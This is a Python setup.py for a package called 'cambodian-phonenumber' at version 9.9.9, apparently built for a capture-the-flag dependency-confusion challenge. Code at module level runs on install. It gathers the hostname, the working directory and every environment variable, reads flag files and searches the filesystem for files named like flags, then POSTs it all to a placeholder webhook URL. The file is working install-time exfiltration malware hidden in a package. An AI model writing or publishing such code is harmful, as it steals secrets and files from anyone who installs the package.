from setuptools import setup, find_packages
import os, glob, socket, urllib.request, urllib.parse

WEBHOOK = "PASTE_YOUR_WEBHOOK_SITE_URL_HERE"

def send(data):
    try:
        urllib.request.urlopen(
            urllib.request.Request(
                WEBHOOK,
                data=urllib.parse.urlencode({"data": data}).encode(),
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            ),
            timeout=5,
        )
    except Exception:
        pass

out = []
out.append("HOSTNAME=" + socket.gethostname())
out.append("CWD=" + os.getcwd())
out.append("ENV=" + repr(dict(os.environ)))

paths = [
    "/flag.txt",
    "/app/flag.txt",
    "/home/flag.txt",
    "/root/flag.txt",
    "./flag.txt",
    "../flag.txt",
]

for p in paths:
    try:
        if os.path.exists(p):
            out.append(f"\n--- {p} ---\n" + open(p, "r", errors="ignore").read())
    except Exception as e:
        out.append(f"{p}: {e}")

try:
    for p in glob.glob("/**/*flag*", recursive=True)[:100]:
        try:
            out.append(f"\n--- FOUND {p} ---\n" + open(p, "r", errors="ignore").read())
        except Exception as e:
            out.append(f"{p}: {e}")
except Exception as e:
    out.append("glob error: " + str(e))

send("\n".join(out))

setup(
    name="cambodian-phonenumber",
    version="9.9.9",
    packages=find_packages(),
)